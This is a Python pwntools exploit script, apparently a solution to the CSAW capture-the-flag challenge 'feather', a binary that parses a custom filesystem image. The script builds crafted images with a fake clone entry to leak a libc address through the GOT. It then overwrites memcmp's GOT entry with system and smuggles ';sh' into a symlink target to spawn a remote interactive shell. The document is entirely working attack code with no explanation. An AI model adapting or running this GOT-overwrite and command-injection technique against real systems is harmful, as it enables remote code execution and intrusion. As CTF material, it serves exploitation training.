import base64
from pwn import *

TYPE_DIR = 0
TYPE_FILE = 1
TYPE_CLON = 2
TYPE_SYM = 3
TYPE_HARD = 4
TYPE_LABEL = 5


def segment(type, id, offset, length):
    return p32(type) + p32(id) + p32(offset) + p32(length)


def directory(name, entries):
    d = p32(len(name)) + p32(len(entries)) + name
    for entry in entries:
        d += p32(entry)
    return d


def file(name, contents):
    return p32(len(name)) + p32(len(contents)) + name + contents


def clone(name, inode):
    return p32(len(name)) + p32(inode) + name


def symlink(name, target):
    return p32(len(name)) + p32(len(target)) + name + target


def hardlink(name, target):
    return p32(len(name)) + p32(target) + name


def label(name):
    return name


elf = ELF("./feather")
# sock = Process("./feather")
# libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
# sock = Socket("localhost", 9999)
sock = remote("pwn.chal.csaw.io", 5017)
libc = ELF("./libc-2.31.so")
"""
Stage 1: libc leak
"""
addr_target = elf.got['memcmp']
fake_entry = p64(TYPE_CLON)  # type
fake_entry += p64(elf.got("puts"))  # filename (leak target)
fake_entry += p64(0x10) * 2
fake_entry += p64(0)
fake_entry += p64(0xdead)  # inode
fake_entry += p64(addr_target)  # cache->begin
fake_entry += p64(addr_target)  # cache->end
fake_entry += p64(addr_target + 0x100)  # cache->capacity
fake_entry += p64(0)
fake_entry += p64(2)  # variant type
payload = p64(elf.symbols["_start"])
data = [
    (TYPE_DIR, 0x0000, directory(b"", [0xcafe, 0xbad0])),
    (TYPE_FILE, 0xdead, file(b"A" * 0x10, payload)),
    (TYPE_HARD, 0xcafe, hardlink(b"C", 0x0002)),
    (TYPE_LABEL, 0xffff, label(fake_entry)),
    (TYPE_FILE, 0xbad1, file(b"B", b"b" * 0x10)),
    (TYPE_SYM, 0xbad0, symlink(b"D" * 0x10, b"/B")),  # calls memcmp
]
fs = b"FEATHER\x00"
fs += p32(len(data))
ofs = 0
for datum in data:
    fs += segment(type=datum[0], id=datum[1], offset=ofs, length=len(datum[2]))
    ofs += len(datum[2])
for datum in data:
    fs += datum[2]
b = base64.b64encode(fs)
sock.recvline()
sock.sendline(b + b'\n')
r = sock.recvregex(b"(.+): File, 8 bytes")
libc_base = u64(r[0][2:]) - libc.symbols["puts"]
log.info("libc = " + hex(libc_base))
"""
Stage 2: Get the shell!
"""
# addr_target = elf.got("_ZdlPvm")
addr_target = elf.got["memcmp"]
fake_entry = p64(TYPE_CLON)  # type
fake_entry += p64(elf.got["puts"])  # filename
fake_entry += p64(0x10) * 2
fake_entry += p64(0)
fake_entry += p64(0xdead)  # inode
fake_entry += p64(addr_target)  # cache->begin
fake_entry += p64(addr_target)  # cache->end
fake_entry += p64(addr_target + 0x100)  # cache->capacity
fake_entry += p64(0)
fake_entry += p64(2)  # variant type
payload = p64(libc_base + libc.symbols["system"])
data = [
    (TYPE_DIR, 0x0000, directory(b"", [0xcafe, 0xbad0])),
    (TYPE_FILE, 0xdead, file(b"A" * 0x10, payload)),
    (TYPE_HARD, 0xcafe, hardlink(b"C", 0x0002)),
    (TYPE_LABEL, 0xffff, label(fake_entry)),
    (TYPE_FILE, 0xbad1, file(b"B", b"ponta")),
    (TYPE_SYM, 0xbad0, symlink(b"D", b"/B/;sh")),  # calls memcmp
]
fs = b"FEATHER\x00"
fs += p32(len(data))
ofs = 0
for datum in data:
    fs += segment(type=datum[0], id=datum[1], offset=ofs, length=len(datum[2]))
    ofs += len(datum[2])
for datum in data:
    fs += datum[2]
b = base64.b64encode(fs)
sock.recvline()
sock.recvline()
sock.sendline(b + b'\n')
sock.interactive()
